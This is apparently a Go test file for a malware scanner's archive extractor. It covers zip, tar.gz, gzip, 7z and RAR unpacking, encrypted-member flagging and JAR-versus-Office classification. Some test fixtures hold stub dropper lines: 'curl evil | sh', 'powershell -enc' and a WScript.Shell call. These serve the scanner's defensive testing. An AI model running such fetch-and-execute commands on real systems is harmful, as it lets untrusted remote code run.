package extract

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"testing"
	"time"

	rardecode "github.com/nwaples/rardecode/v2"
)

// TestExtractDeadlineStopsArchive verifies the extraction deadline is honored by
// the archive path (not just fromOLE/fromOOXML): a plain dropper zip with several
// members yields its members under a generous deadline, but an already-expired
// deadline must short-circuit so no members are unpacked. Extraction runs inside
// the held scan-CPU slot, so this bounds wall-clock against a CPU-heavy nested
// decompressor.
func TestExtractDeadlineStopsArchive(t *testing.T) {
	zipBytes := buildZip(t, map[string][]byte{
		"a.js":  bytes.Repeat([]byte("payload-a;"), 64),
		"b.bat": bytes.Repeat([]byte("payload-b;"), 64),
		"c.vbs": bytes.Repeat([]byte("payload-c;"), 64),
	})

	// Generous deadline: members are unpacked.
	ok := Extract(zipBytes, time.Now().Add(10*time.Second))
	if len(ok.Streams) == 0 {
		t.Fatal("with a live deadline the plain zip members should be unpacked")
	}

	// Already-expired deadline: the archive walk must skip everything.
	past := Extract(zipBytes, time.Now().Add(-time.Second))
	if len(past.Streams) != 0 {
		t.Errorf("expired deadline: archive members still unpacked: %d streams", len(past.Streams))
	}
}

// TestExtractArchiveOfficeMemberNotPartDumped is the FP guard: a nested zip that
// is an Office document (OOXML markers) dropped inside a plain archive must go
// through the macro path only — its ordinary body parts (document.xml, …) must
// NOT be surfaced as member streams (that would scan normal text and FP). A
// macro-free .docx therefore contributes zero streams from inside the archive,
// unlike a plain zip member which IS dumped.
func TestExtractArchiveOfficeMemberNotPartDumped(t *testing.T) {
	docx := buildZip(t, map[string][]byte{
		"[Content_Types].xml": []byte(`<?xml version="1.0"?><Types/>`),
		"word/document.xml":   []byte("UNIQUE_BODY_TEXT_should_not_be_scanned_as_a_member"),
		"_rels/.rels":         []byte("<Relationships/>"),
	})
	outer := buildZip(t, map[string][]byte{"report.docx": docx})

	res := Extract(outer, time.Time{})
	for i, s := range res.Streams {
		if bytes.Contains(s, []byte("UNIQUE_BODY_TEXT_should_not_be_scanned_as_a_member")) {
			t.Fatalf("office-doc body part %d was part-dumped from the archive (FP guard broken)", i)
		}
	}
}

// TestExtractJarMembersUnpacked is the JAR/APK regression: a zip carrying
// META-INF/MANIFEST.MF (the Java/Android marker) but NONE of the Office roots
// must be treated as a PLAIN ARCHIVE and have its members unpacked — not routed
// to the macro path (which would leave the .class / nested-jar payload unscanned).
// This is the Adwind/jRAT/STRRAT mail vector. Before the isOfficeClassPart split,
// the bare META-INF/ entry mis-classified the jar as an Office document.
func TestExtractJarMembersUnpacked(t *testing.T) {
	classPayload := []byte("\xCA\xFE\xBA\xBEUNIQUE_JAR_CLASS_PAYLOAD")
	jar := buildZip(t, map[string][]byte{
		"META-INF/MANIFEST.MF":   []byte("Manifest-Version: 1.0\r\nMain-Class: Evil\r\n"),
		"Evil.class":             classPayload,
		"com/evil/Dropper.class": []byte("\xCA\xFE\xBA\xBEsecond class"),
	})

	res := Extract(jar, time.Time{})
	if !res.IsArchive {
		t.Fatal("jar not flagged IsArchive — mis-classified as Office, members not unpacked")
	}
	found := false
	for _, s := range res.Streams {
		if bytes.Contains(s, []byte("UNIQUE_JAR_CLASS_PAYLOAD")) {
			found = true
			break
		}
	}
	if !found {
		t.Fatalf("jar .class member was not surfaced as a stream (streams=%d)", len(res.Streams))
	}
}

// TestIsOfficeZipClassification pins the classification predicate: a JAR/APK
// (bare META-INF/, no office root) is NOT Office; a genuine OOXML (.docx) and ODF
// (.odt via mimetype) document IS — so the macro-path FP guard still applies to
// real documents while JAR/APK fall through to member-unpacking.
func TestIsOfficeZipClassification(t *testing.T) {
	jar := buildZip(t, map[string][]byte{
		"META-INF/MANIFEST.MF": []byte("Manifest-Version: 1.0\r\n"),
		"Evil.class":           []byte("\xCA\xFE\xBA\xBE"),
	})
	if isOfficeZip(jar) {
		t.Fatal("jar (bare META-INF/) wrongly classified as Office")
	}

	docx := buildZip(t, map[string][]byte{
		"[Content_Types].xml": []byte(`<?xml version="1.0"?><Types/>`),
		"word/document.xml":   []byte("<doc/>"),
	})
	if !isOfficeZip(docx) {
		t.Fatal(".docx ([Content_Types].xml) not classified as Office")
	}

	// A docx-shaped fixture WITHOUT the root part but with a word/ part still
	// classifies (hand-built-fixture allowance retained).
	docxNoRoot := buildZip(t, map[string][]byte{
		"word/document.xml": []byte("<doc/>"),
		"_rels/.rels":       []byte("<Relationships/>"),
	})
	if !isOfficeZip(docxNoRoot) {
		t.Fatal("word/ part fixture not classified as Office")
	}

	odt := buildZip(t, map[string][]byte{
		"mimetype":              []byte("application/vnd.oasis.opendocument.text"),
		"META-INF/manifest.xml": []byte("<manifest/>"),
		"content.xml":           []byte("<office/>"),
	})
	if !isOfficeZip(odt) {
		t.Fatal(".odt (mimetype) not classified as Office")
	}
}

// buildZip builds an in-memory zip from name→data entries.
func buildZip(t *testing.T, entries map[string][]byte) []byte {
	t.Helper()
	var b bytes.Buffer
	zw := zip.NewWriter(&b)
	for name, data := range entries {
		w, err := zw.Create(name)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := w.Write(data); err != nil {
			t.Fatal(err)
		}
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	return b.Bytes()
}

// buildGzip gzip-wraps one blob.
func buildGzip(t *testing.T, data []byte) []byte {
	t.Helper()
	var b bytes.Buffer
	gw := gzip.NewWriter(&b)
	if _, err := gw.Write(data); err != nil {
		t.Fatal(err)
	}
	if err := gw.Close(); err != nil {
		t.Fatal(err)
	}
	return b.Bytes()
}

// buildTarGz builds a gzip-compressed tar from name→data entries.
func buildTarGz(t *testing.T, entries map[string][]byte) []byte {
	t.Helper()
	var tb bytes.Buffer
	tw := tar.NewWriter(&tb)
	for name, data := range entries {
		if err := tw.WriteHeader(&tar.Header{Name: name, Mode: 0o644, Size: int64(len(data)), Typeflag: tar.TypeReg}); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write(data); err != nil {
			t.Fatal(err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	return buildGzip(t, tb.Bytes())
}

// buildEncryptedZip builds a zip whose single member has the general-purpose
// "encrypted" flag (bit 0) set. The body is written in the clear (Go's zip
// writer has no encryptor), which is fine: yarad detects the flag and skips the
// member BEFORE any Open/decrypt, so this faithfully exercises the detection
// path without needing a real cipher.
func buildEncryptedZip(t *testing.T, name string, data []byte) []byte {
	t.Helper()
	var b bytes.Buffer
	zw := zip.NewWriter(&b)
	w, err := zw.CreateHeader(&zip.FileHeader{Name: name, Method: zip.Store, Flags: 0x1})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := w.Write(data); err != nil {
		t.Fatal(err)
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	return b.Bytes()
}

// A password-protected zip member must emit the ARCHIVE-ENCRYPTED marker (a
// hidden-payload mail tell) and must NOT surface the encrypted bytes as content.
func TestExtractEncryptedZipFlagged(t *testing.T) {
	buf := buildEncryptedZip(t, "secret.exe", []byte("MZ encrypted dropper body"))
	res := Extract(buf, time.Time{})
	if !res.EncryptedArchive {
		t.Error("encrypted zip member did not set EncryptedArchive")
	}
	if !streamsContain(res, "ARCHIVE-ENCRYPTED") {
		t.Error("encrypted zip did not emit ARCHIVE-ENCRYPTED marker")
	}
	if streamsContain(res, "encrypted dropper body") {
		t.Error("encrypted member body was surfaced (cannot be — no password)")
	}
}

// A clean (unencrypted) zip must NOT be flagged or marked.
func TestExtractCleanZipNotFlaggedEncrypted(t *testing.T) {
	buf := buildZip(t, map[string][]byte{"ok.txt": []byte("plain member body")})
	res := Extract(buf, time.Time{})
	if res.EncryptedArchive {
		t.Error("clean zip falsely flagged EncryptedArchive")
	}
	if streamsContain(res, "ARCHIVE-ENCRYPTED") {
		t.Error("clean zip falsely emitted ARCHIVE-ENCRYPTED marker")
	}
}

// The marker is emitted at most once even across multiple encrypted members /
// nested archives, so it stays a signal rather than per-member noise.
func TestExtractEncryptedMarkerEmittedOnce(t *testing.T) {
	var b bytes.Buffer
	zw := zip.NewWriter(&b)
	for _, n := range []string{"a.exe", "b.exe", "c.exe"} {
		w, err := zw.CreateHeader(&zip.FileHeader{Name: n, Method: zip.Store, Flags: 0x1})
		if err != nil {
			t.Fatal(err)
		}
		_, _ = w.Write([]byte("body"))
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	res := Extract(b.Bytes(), time.Time{})
	n := 0
	for _, s := range res.Streams {
		if string(s) == "ARCHIVE-ENCRYPTED" {
			n++
		}
	}
	for _, s := range res.Markers {
		if string(s) == "ARCHIVE-ENCRYPTED" {
			n++
		}
	}
	if n != 1 {
		t.Errorf("ARCHIVE-ENCRYPTED emitted %d times, want exactly 1", n)
	}
}

// A whole-archive header-encrypted 7z/RAR fails at the reader level (NewReader
// for 7z, the first rr.Next() for RAR) before any per-member loop runs, so the
// new unpack7z/unpackRar reader-error branches depend on isEncryptedErr
// classifying those library errors as encryption. No 7z/rar writer exists in the
// stdlib (and no CLI on the build host) to synthesize a binary fixture, so pin
// the contract against the libraries' actual exported sentinel errors: the ones
// rardecode/sevenzip return when a password is required must classify as
// encrypted, and plain corruption must NOT.
func TestIsEncryptedErr_HeaderEncryptedReaderErrors(t *testing.T) {
	encrypted := []error{
		rardecode.ErrArchiveEncrypted,      // "rardecode: archive encrypted, password required"
		rardecode.ErrArchivedFileEncrypted, // "rardecode: archived files encrypted, password required"
		// sevenzip's aes7z reader surfaces this when streamsInfo is header-encrypted.
		errors.New("aes7z: no password set"),
		fmt.Errorf("sevenzip: error setting password: %w", errors.New("aes7z: no password set")),
	}
	for _, e := range encrypted {
		if !isEncryptedErr(e) {
			t.Errorf("isEncryptedErr(%q) = false, want true (header-encrypted archive)", e)
		}
	}
	notEncrypted := []error{
		nil,
		errors.New("unexpected EOF"),
		errors.New("rardecode: corrupt block header"),
		errors.New("sevenzip: invalid signature header"),
	}
	for _, e := range notEncrypted {
		if isEncryptedErr(e) {
			t.Errorf("isEncryptedErr(%v) = true, want false (generic corruption, not encryption)", e)
		}
	}
}

// streamsContain searches the union of what the scanner scans: real content
// (res.Streams) plus the out-of-band marker channel (res.Markers, PLAN Phase 1).
func streamsContain(res Result, needle string) bool {
	for _, s := range res.Streams {
		if bytes.Contains(s, []byte(needle)) {
			return true
		}
	}
	for _, s := range res.Markers {
		if bytes.Contains(s, []byte(needle)) {
			return true
		}
	}
	return false
}

// A plain (non-OOXML) zip's file members must be surfaced for scanning.
func TestExtractZipMembers(t *testing.T) {
	buf := buildZip(t, map[string][]byte{
		"dropper.js": []byte("var x = new ActiveXObject('WScript.Shell'); dropper payload"),
		"readme.txt": []byte("nothing to see"),
	})
	res := Extract(buf, time.Time{})
	if !res.IsArchive {
		t.Fatal("zip not flagged IsArchive")
	}
	if !streamsContain(res, "dropper payload") {
		t.Errorf("zip member not surfaced; got %d streams", len(res.Streams))
	}
}

// A gzip-wrapped script must be decompressed and surfaced.
func TestExtractGzip(t *testing.T) {
	buf := buildGzip(t, []byte("powershell -enc ... gzip dropper payload"))
	res := Extract(buf, time.Time{})
	if !res.IsArchive {
		t.Fatal("gzip not flagged IsArchive")
	}
	if !streamsContain(res, "gzip dropper payload") {
		t.Errorf("gzip content not surfaced; got %d streams", len(res.Streams))
	}
}

// A .tar.gz must have its tar members walked, not emitted as one tar blob.
func TestExtractTarGz(t *testing.T) {
	buf := buildTarGz(t, map[string][]byte{
		"bin/evil.sh": []byte("#!/bin/sh\ncurl evil | sh   targz dropper payload"),
	})
	res := Extract(buf, time.Time{})
	if !res.IsArchive {
		t.Fatal("tar.gz not flagged IsArchive")
	}
	if !streamsContain(res, "targz dropper payload") {
		t.Errorf("tar member not surfaced; got %d streams", len(res.Streams))
	}
}

// A nested archive (zip inside zip) must be recursed into so the inner payload
// is reached.
func TestExtractNestedZip(t *testing.T) {
	inner := buildZip(t, map[string][]byte{"inner.exe": []byte("MZ deeply nested payload")})
	outer := buildZip(t, map[string][]byte{"inner.zip": inner})
	res := Extract(outer, time.Time{})
	if !streamsContain(res, "deeply nested payload") {
		t.Errorf("nested zip payload not reached; got %d streams", len(res.Streams))
	}
}

// A gzip wrapping a zip must recurse: gz → zip → member.
func TestExtractGzippedZip(t *testing.T) {
	inner := buildZip(t, map[string][]byte{"x.bat": []byte("@echo off  gz-of-zip dropper payload")})
	buf := buildGzip(t, inner)
	res := Extract(buf, time.Time{})
	if !streamsContain(res, "gz-of-zip dropper payload") {
		t.Errorf("gz-of-zip payload not reached; got %d streams", len(res.Streams))
	}
}

// Recursion depth must be bounded: a deeply nested zip quine must not be
// unpacked past maxArchiveDepth, and must never panic or hang.
func TestExtractArchiveDepthBounded(t *testing.T) {
	buf := buildZip(t, map[string][]byte{"leaf": []byte("leaf payload")})
	// Wrap well past maxArchiveDepth.
	for i := 0; i < maxArchiveDepth+4; i++ {
		buf = buildZip(t, map[string][]byte{"next.zip": buf})
	}
	res := Extract(buf, time.Time{})
	if res.Panicked {
		t.Fatal("deep nesting panicked")
	}
	// The leaf is below maxArchiveDepth, so it must NOT be reached.
	if streamsContain(res, "leaf payload") {
		t.Error("recursion exceeded maxArchiveDepth (leaf reached)")
	}
}

// A real 7z fixture (testdata/payload.7z) must be decompressed and its member
// surfaced.
func TestExtract7z(t *testing.T) {
	buf, err := os.ReadFile(filepath.Join("testdata", "payload.7z"))
	if err != nil {
		t.Skipf("7z fixture missing: %v", err)
	}
	res := Extract(buf, time.Time{})
	if !res.IsArchive {
		t.Fatal("7z not flagged IsArchive")
	}
	if !streamsContain(res, "nested archive payload") {
		t.Errorf("7z member not surfaced; got %d streams", len(res.Streams))
	}
}

// A real RAR fixture (testdata/payload.rar) must be decompressed and its member
// surfaced.
func TestExtractRar(t *testing.T) {
	buf, err := os.ReadFile(filepath.Join("testdata", "payload.rar"))
	if err != nil {
		t.Skipf("rar fixture missing: %v", err)
	}
	res := Extract(buf, time.Time{})
	if !res.IsArchive {
		t.Fatal("rar not flagged IsArchive")
	}
	if !streamsContain(res, "nested archive payload") {
		t.Errorf("rar member not surfaced; got %d streams", len(res.Streams))
	}
}

// Garbage that merely starts with an archive magic must fail open (no panic, no
// crash), emitting nothing.
func TestExtractArchiveGarbage(t *testing.T) {
	for _, magic := range [][]byte{gzipMagic, sevenZMagic, rarMagic} {
		buf := append(append([]byte(nil), magic...), bytes.Repeat([]byte{0x41}, 200)...)
		res := Extract(buf, time.Time{})
		if res.Panicked {
			t.Errorf("garbage with magic %x panicked", magic)
		}
	}
}

// A non-archive buffer must not be flagged IsArchive.
func TestExtractNotArchive(t *testing.T) {
	res := Extract([]byte("just plain text, no archive magic here"), time.Time{})
	if res.IsArchive {
		t.Error("plain text wrongly flagged IsArchive")
	}
}

// TestEmitMemberPanicRecovery verifies that emitMember does not propagate a panic
// on hostile data. A blob that begins with OLE magic but is otherwise garbage may
// drive oleparse to panic inside extractChild; the defer/recover guard must catch
// it and mark res.Panicked without losing already-written streams.
func TestEmitMemberPanicRecovery(t *testing.T) {
	// Prepend a sentinel stream so we can verify partial results are preserved.
	sentinel := []byte("sentinel-stream")
	res := &Result{Streams: [][]byte{sentinel}}
	bud := &archiveBudget{}
	hostile := append(append([]byte{}, oleMagic...), bytes.Repeat([]byte{0xFF}, 4096)...)
	// Must not panic.
	emitMember(hostile, res, bud, 0, time.Time{})
	if len(res.Streams) == 0 || !bytes.Equal(res.Streams[0], sentinel) {
		t.Error("partial streams before the panic should be preserved")
	}
}

// TestOfficeZipCarrierMemberUnpacked is the #7 fix: an Office-classified zip (a
// valid .docx with [Content_Types].xml) that also carries a SIBLING dropper
// member must have that member carrier-unpacked, while its body XML parts are NOT
// member-dumped. Before the fix, isOfficeZip→true skipped ALL member unpacking,
// so a dropper riding inside a spoofed/real Office container was invisible.
func TestOfficeZipCarrierMemberUnpacked(t *testing.T) {
	// A sibling member that is itself a nested zip hiding a dropper keyword.
	innerDropper := buildZip(t, map[string][]byte{"payload.bin": []byte("OFFICE_SIBLING_DROPPER_KEYWORD")})
	docx := buildZip(t, map[string][]byte{
		"[Content_Types].xml": []byte(`<?xml version="1.0"?><Types/>`),
		"word/document.xml":   []byte("ordinary harmless document body text"),
		"_rels/.rels":         []byte("<Relationships/>"),
		"attachment.zip":      innerDropper, // non-office sibling carrier
	})
	res := Extract(docx, time.Time{})
	if !streamsContain(res, "OFFICE_SIBLING_DROPPER_KEYWORD") {
		t.Errorf("sibling-zip dropper inside an Office zip not unpacked; streams=%d", len(res.Streams))
	}
}

// A sibling PE member of an Office zip must be recognised as a carrier (routed
// through extractChild) so PE-aware handling applies.
func TestOfficeZipSiblingPECarrier(t *testing.T) {
	docx := buildZip(t, map[string][]byte{
		"[Content_Types].xml": []byte(`<?xml version="1.0"?><Types/>`),
		"word/document.xml":   []byte("body"),
		"setup.exe":           minimalPE(),
	})
	// isNestedCarrier must classify the PE sibling as a carrier.
	if !isNestedCarrier(minimalPE()) {
		t.Fatal("minimal PE not classified as a nested carrier")
	}
	res := Extract(docx, time.Time{})
	if res.Failed {
		t.Errorf("office zip with PE sibling unexpectedly Failed: %+v", res)
	}
	found := false
	for _, s := range res.Streams {
		if bytes.Equal(s, minimalPE()) {
			found = true
			break
		}
	}
	if !found {
		t.Fatalf("office zip PE sibling was not surfaced as a stream; streams=%d", len(res.Streams))
	}
}

// TestOfficeZipCleanNoBodyDump is the no-FP guard: a clean Office zip whose only
// non-office content is ordinary body text must NOT have that body member-dumped
// — fromOfficeZipCarriers only routes carrier members, never plain text/XML, so a
// benign document does not gain spurious streams.
func TestOfficeZipCleanNoBodyDump(t *testing.T) {
	docx := buildZip(t, map[string][]byte{
		"[Content_Types].xml": []byte(`<?xml version="1.0"?><Types/>`),
		"word/document.xml":   []byte("a perfectly ordinary memo with the word powershell in prose"),
		"docProps/core.xml":   []byte(`<?xml version="1.0"?><cp/>`),
		"readme.txt":          []byte("plain attached note, not a carrier, mentions cmd.exe in passing"),
	})
	res := Extract(docx, time.Time{})
	// The plain readme.txt is not a carrier → must not be unpacked as a stream.
	if streamsContain(res, "plain attached note") {
		t.Error("non-carrier body/text member was member-dumped (body-text FP risk)")
	}
}

// isNestedCarrier must reject ordinary text so a benign Office sibling is never
// member-dumped.
func TestIsNestedCarrierRejectsText(t *testing.T) {
	if isNestedCarrier([]byte("just some plain ascii text, definitely not a container")) {
		t.Error("plain text wrongly classified as a carrier")
	}
	if isNestedCarrier(nil) {
		t.Error("nil wrongly classified as a carrier")
	}
}

// TestPreallocHint (PERF-40) pins the anti-amplification clamp: the pre-Grow hint
// is the declared size bounded by BOTH the per-read hard cap and the modest
// maxPreallocHint ceiling, and an unknown (zero) size yields no speculative
// allocation. A member that LIES about its size can therefore force at most
// maxPreallocHint of pre-allocation, never the multi-MiB hard cap.
func TestPreallocHint(t *testing.T) {
	cases := []struct {
		name     string
		declared uint64
		hardCap  uint64
		want     int
	}{
		{"zero_unknown", 0, maxBytesPerMember, 0},
		{"small_honest", 4096, maxBytesPerMember, 4096},
		{"at_hint_ceiling", maxPreallocHint, maxBytesPerMember, maxPreallocHint},
		{"over_hint_under_cap", maxPreallocHint + 1, maxBytesPerMember, maxPreallocHint},
		{"lying_huge", 1 << 30, maxBytesPerMember, maxPreallocHint},
		{"declared_over_smallcap", 1 << 20, 64 << 10, 64 << 10}, // hard cap below hint wins
	}
	for _, c := range cases {
		if got := preallocHint(c.declared, c.hardCap); got != c.want {
			t.Errorf("%s: preallocHint(%d, %d) = %d, want %d", c.name, c.declared, c.hardCap, got, c.want)
		}
	}
}
